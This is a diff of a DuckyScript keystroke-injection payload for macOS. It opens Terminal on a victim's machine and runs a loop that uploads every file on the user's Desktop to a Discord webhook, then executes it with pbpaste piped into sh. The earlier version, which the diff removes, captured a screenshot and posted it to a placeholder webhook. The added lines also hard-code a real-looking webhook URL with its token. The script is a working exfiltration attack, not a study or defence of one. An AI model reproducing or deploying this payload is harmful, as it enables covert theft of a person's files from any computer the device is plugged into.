@@ -9,15 +9,27 @@ DELAY 250
 STRING CONTACTS
 DELAY 250
 ENTER
-DELAY 500
-GUI SHIFT m
+DELAY 250
+GUI-SHIFT m
+DELAY 250
+GUI-SHIFT 5
+DELAY 250
+ENTER
 DELAY 250
 GUI SPACE
 DELAY 250
 STRING TERMINAL
 DELAY 250
-STRING screencapture -x screenshot.png && curl -X POST -H "Content-Type: multipart/form-data" -F "file=@screenshot.png" "YOUR_WEBHOOK" && rm screenshot.png
+ENTER
+DELAY 5000
+STRING echo for file in /Users/$(whoami)/Desktop/*; do curl -X POST -H "Content-Type: multipart/form-data" -F "file=@\"$file\"" https://discord.com/api/webhooks/1296512673327878145/0h0RYRZEzKa3mIOsSYOJFLbRcxs5KUBhxP1oBbWdbKqbPgzKvENd8yKmyxALnTnpylOL; done |pbcopy
 DELAY 850
 ENTER
-DELAY 500
-GUI q
+DELAY 250
+STRING pbpaste | sh
+DELAY 250
+ENTER
+
+
+
+
